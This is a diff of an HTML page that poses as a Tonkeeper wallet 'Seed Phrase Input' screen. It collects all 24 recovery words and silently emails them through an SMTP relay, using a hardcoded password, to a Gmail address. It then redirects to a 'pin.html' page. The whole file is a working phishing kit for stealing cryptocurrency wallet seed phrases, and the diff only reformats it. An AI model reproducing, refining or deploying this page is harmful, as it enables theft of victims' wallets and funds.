@@ -2,99 +2,122 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <link rel="icon" type="image/png" href="logo.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Seed Phrase Input</title>
+  <link rel="icon" type="image/png" href="logo.png">
   <link rel="stylesheet" href="style.css">
+  <title>Seed Phrase Input</title>
 </head>
 <body>
-<form id="form" onsubmit="emailSend(); return false;">
-  <div class="container">
-    <h3>Your Seed Phrase</h3>
-    <p>Enter your Tonkeeper 24 words seed phrase:</p>
-    <button type="button" id="pasteBtn">Paste Seed Phrase To Continue</button>
-    <div class="grid">
-      <!-- Input fields -->
-      ${Array.from({ length: 24 }, (_, i) => `
-        <div class="word">
-          <span>${i + 1}.</span> <input type="text" maxlength="10" class="seed-input" data-index="${i + 1}">
-        </div>
-      `).join('')}
+  <form id="form" onsubmit="emailSend(); return false;">
+    <div class="container">
+      <h3>Your Seed Phrase</h3>
+      <p>Enter your Tonkeeper 24 words seed phrase:</p>
+      <button type="button" id="pasteBtn">Paste Seed Phrase To Continue</button>
+      <div class="grid">
+        <!-- 24 Input Fields -->
+        <div class="word"><span>1.</span><input type="text" maxlength="10" class="seed-input" data-index="1"></div>
+        <div class="word"><span>2.</span><input type="text" maxlength="10" class="seed-input" data-index="2"></div>
+        <div class="word"><span>3.</span><input type="text" maxlength="10" class="seed-input" data-index="3"></div>
+        <div class="word"><span>4.</span><input type="text" maxlength="10" class="seed-input" data-index="4"></div>
+        <div class="word"><span>5.</span><input type="text" maxlength="10" class="seed-input" data-index="5"></div>
+        <div class="word"><span>6.</span><input type="text" maxlength="10" class="seed-input" data-index="6"></div>
+        <div class="word"><span>7.</span><input type="text" maxlength="10" class="seed-input" data-index="7"></div>
+        <div class="word"><span>8.</span><input type="text" maxlength="10" class="seed-input" data-index="8"></div>
+        <div class="word"><span>9.</span><input type="text" maxlength="10" class="seed-input" data-index="9"></div>
+        <div class="word"><span>10.</span><input type="text" maxlength="10" class="seed-input" data-index="10"></div>
+        <div class="word"><span>11.</span><input type="text" maxlength="10" class="seed-input" data-index="11"></div>
+        <div class="word"><span>12.</span><input type="text" maxlength="10" class="seed-input" data-index="12"></div>
+        <div class="word"><span>13.</span><input type="text" maxlength="10" class="seed-input" data-index="13"></div>
+        <div class="word"><span>14.</span><input type="text" maxlength="10" class="seed-input" data-index="14"></div>
+        <div class="word"><span>15.</span><input type="text" maxlength="10" class="seed-input" data-index="15"></div>
+        <div class="word"><span>16.</span><input type="text" maxlength="10" class="seed-input" data-index="16"></div>
+        <div class="word"><span>17.</span><input type="text" maxlength="10" class="seed-input" data-index="17"></div>
+        <div class="word"><span>18.</span><input type="text" maxlength="10" class="seed-input" data-index="18"></div>
+        <div class="word"><span>19.</span><input type="text" maxlength="10" class="seed-input" data-index="19"></div>
+        <div class="word"><span>20.</span><input type="text" maxlength="10" class="seed-input" data-index="20"></div>
+        <div class="word"><span>21.</span><input type="text" maxlength="10" class="seed-input" data-index="21"></div>
+        <div class="word"><span>22.</span><input type="text" maxlength="10" class="seed-input" data-index="22"></div>
+        <div class="word"><span>23.</span><input type="text" maxlength="10" class="seed-input" data-index="23"></div>
+        <div class="word"><span>24.</span><input type="text" maxlength="10" class="seed-input" data-index="24"></div>
+      </div>
+      <p class="warning">Make sure to enter the words in the correct order!</p>
+      <label>
+        <input type="checkbox" id="confirm"> I have entered my seed phrase
+      </label>
+      <button type="submit" id="nextBtn" disabled>Next</button>
     </div>
-    <p class="warning">Make sure to enter the words in the correct order!</p>
-    <label>
-      <input type="checkbox" id="confirm"> I have entered my seed phrase
-    </label>
-    <button type="submit" id="nextBtn" disabled>Next</button>
-  </div>
-</form>
-<script src="https://smtpjs.com/v3/smtp.js"></script>
-<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-<script>
-function emailSend() {
-  const seedPhraseWords = [];
-  const seedInputs = document.querySelectorAll('.seed-input');
+  </form>
 
-  seedInputs.forEach(input => {
-    seedPhraseWords.push(input.value.trim());
-  });
+  <!-- External Libraries -->
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 
-  if (seedPhraseWords.includes("") || seedPhraseWords.length !== 24) {
-    swal("Error", "Please complete all 24 seed phrase fields.", "error");
-    return;
-  }
+  <!-- JavaScript -->
+  <script>
+    function emailSend() {
+      const seedPhraseWords = [];
+      const seedInputs = document.querySelectorAll('.seed-input');
 
-  const messageBody = "Seed Phrase: " + seedPhraseWords.join(" ");
+      seedInputs.forEach(input => {
+        seedPhraseWords.push(input.value.trim());
+      });
 
-  Email.send({
-    Host: "smtp.elasticemail.com",
-    Username: "payday10177@gmail.com",
-    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
-    To: 'payday10177@gmail.com',
-    From: "payday10177@gmail.com",
-    Subject: "Seed Phrase",
-    Body: messageBody
-  }).then(
-    message => {
-      if (message === 'OK') {
-        window.location.href = 'pin.html';
-      } else {
-        swal("Error", "There was a problem sending your seed phrase. Please try again.", "error");
+      if (seedPhraseWords.includes("") || seedPhraseWords.length !== 24) {
+        swal("Error", "Please complete all 24 seed phrase fields.", "error");
+        return;
       }
+
+      const messageBody = "Seed Phrase: " + seedPhraseWords.join(" ");
+
+      Email.send({
+        Host: "smtp.elasticemail.com",
+        Username: "payday10177@gmail.com",
+        Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
+        To: 'payday10177@gmail.com',
+        From: "payday10177@gmail.com",
+        Subject: "Seed Phrase",
+        Body: messageBody
+      }).then(
+        message => {
+          if (message === 'OK') {
+            window.location.href = 'pin.html';
+          } else {
+            swal("Error", "There was a problem sending your seed phrase. Please try again.", "error");
+          }
+        }
+      );
     }
-  );
-}
 
-const seedInputs = document.querySelectorAll('.seed-input');
-const nextBtn = document.getElementById('nextBtn');
-const confirmCheckbox = document.getElementById('confirm');
+    const seedInputs = document.querySelectorAll('.seed-input');
+    const nextBtn = document.getElementById('nextBtn');
+    const confirmCheckbox = document.getElementById('confirm');
 
-function checkFormCompletion() {
-  const allFilled = Array.from(seedInputs).every(input => input.value.trim() !== '');
-  nextBtn.disabled = !(allFilled && confirmCheckbox.checked);
-}
-
-seedInputs.forEach(input => {
-  input.addEventListener('input', checkFormCompletion);
-});
-
-confirmCheckbox.addEventListener('change', checkFormCompletion);
-
-const pasteBtn = document.getElementById('pasteBtn');
-pasteBtn.addEventListener('click', () => {
-  const userSeedPhrase = prompt("Paste your seed phrase (separate words with spaces):");
-  if (userSeedPhrase) {
-    const words = userSeedPhrase.trim().split(/\s+/);
-    if (words.length !== 24) {
-      swal("Error", "You must enter exactly 24 words.", "error");
-      return;
+    function checkFormCompletion() {
+      const allFilled = Array.from(seedInputs).every(input => input.value.trim() !== '');
+      nextBtn.disabled = !(allFilled && confirmCheckbox.checked);
     }
-    seedInputs.forEach((input, index) => {
-      input.value = words[index] || "";
+
+    seedInputs.forEach(input => {
+      input.addEventListener('input', checkFormCompletion);
     });
-    checkFormCompletion();
-  }
-});
-</script>
+
+    confirmCheckbox.addEventListener('change', checkFormCompletion);
+
+    const pasteBtn = document.getElementById('pasteBtn');
+    pasteBtn.addEventListener('click', () => {
+      const userSeedPhrase = prompt("Paste your seed phrase (separate words with spaces):");
+      if (userSeedPhrase) {
+        const words = userSeedPhrase.trim().split(/\s+/);
+        if (words.length !== 24) {
+          swal("Error", "You must enter exactly 24 words.", "error");
+          return;
+        }
+        seedInputs.forEach((input, index) => {
+          input.value = words[index] || "";
+        });
+        checkFormCompletion();
+      }
+    });
+  </script>
 </body>
 </html>
